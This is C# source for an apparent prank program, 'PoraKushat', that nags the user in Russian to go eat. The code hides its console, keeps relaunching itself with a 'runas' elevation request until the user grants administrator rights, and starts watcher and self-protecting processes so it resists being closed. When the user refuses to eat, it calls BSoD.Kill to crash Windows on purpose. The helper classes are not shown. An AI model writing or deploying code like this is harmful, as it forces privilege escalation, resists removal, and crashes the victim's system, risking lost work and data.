using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace PoraKushat
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static void Elevate()
        {
            ProcessStartInfo SelfProc = new ProcessStartInfo
            {
                UseShellExecute = true,
                WorkingDirectory = Environment.CurrentDirectory,
                FileName = Process.GetCurrentProcess().MainModule.FileName,
                Verb = "runas"
            };
            try
            {
                Process.Start(SelfProc);
            }
            catch
            {
                Elevate();
            }
        }

        static void onYes()
        {
            MessageBox.Show("Вот и молодец! Когда покушаешь, нажми OK", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
            DialogResult res = MessageBox.Show("Ты не покушал! А ну, быстро иди жрать!", "", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (res == DialogResult.Yes)
            {
                onYes();
            }
            else
            {
                new Thread(BSoD.CurFun).Start();
                MessageBox.Show("Ты меня разозлил!", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                BSoD.Kill(0xDEADDEAD);
            }
        }

        public static string[] args;

        static void Main(string[] args)
        {
            Program.args = args;

            ShowWindow(GetConsoleWindow(), 0);

            bool isElevated;
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);

            if (isElevated == false && !args.Contains("nobsod"))
            {
                Elevate();
            }
            else
            {
                if (args.Contains("watch") && !args.Contains("nobsod"))
                {
                    Watcher.Watch();
                }
                else if (args.Contains("noreboot") && !args.Contains("nobsod"))
                {
                    ProcessProtection.Protect();
                    while (true) { }
                }
                else if (!args.Contains("nobsod"))
                {
                    Watcher.StartNoRebootProcess();
                    Watcher.StartWatcherProcess();
                    Thread.Sleep(100);
                    new Thread(Watcher.Watch).Start();
                }

                MessageBox.Show("Пора кушать!", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                DialogResult res = MessageBox.Show("Ты хочешь кушать?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (res == DialogResult.Yes)
                {
                    onYes();
                }
                else
                {
                    res = MessageBox.Show("Я спросил - ты хочешь кушать?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                    if (res == DialogResult.Yes)
                    {
                        onYes();
                    }
                    else
                    {
                        res = MessageBox.Show("А ну, быстро иди жрать!", "", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                        if (res == DialogResult.Yes)
                        {
                            onYes();
                        }
                        else
                        {
                            res = MessageBox.Show("Последний раз спрашиваю - ты пойдёшь кушать?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                            if (res == DialogResult.Yes)
                            {
                                onYes();
                            }
                            else
                            {
                                new Thread(BSoD.CurFun).Start();
                                MessageBox.Show("Ты меня разозлил!", "", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                BSoD.Kill(0xDEADDEAD);
                            }
                        }
                    }
                }
            }
        }
    }
}
